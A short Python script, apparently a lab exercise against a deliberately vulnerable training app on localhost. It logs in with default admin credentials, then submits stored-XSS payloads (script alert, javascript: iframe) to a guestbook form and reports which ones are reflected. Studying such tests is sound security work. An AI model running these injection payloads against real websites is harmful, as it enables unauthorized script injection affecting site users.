import requests
import re

payloads=["<h1>alert", "<script>alert(xss)</script>", '<iframe src="javascript:alert(`xss`)">']
urllogin="http://localhost/login.php"
urlxss="http://localhost/vulnerabilities/xss_s/"

sesja=requests.Session()
token=re.search(r"name='user_token' value='(.*)'", sesja.get(urllogin).text)
login={'username':'admin','password':'password','Login':'Login','user_token':token.group(1)}
sesja.post(urllogin, data=login)

def xss():
    for payload in payloads:
        dane={"txtName":'x','mtxMessage':payload,'btnSign':'Sign+Guestbook'}
        sesja.post(url=urlxss, data=dane)
        req=sesja.get(urlxss)
        if payload in req.text:
            print(f'podatnosc XSS dla: {payload}')

if __name__=='__main__':
    xss()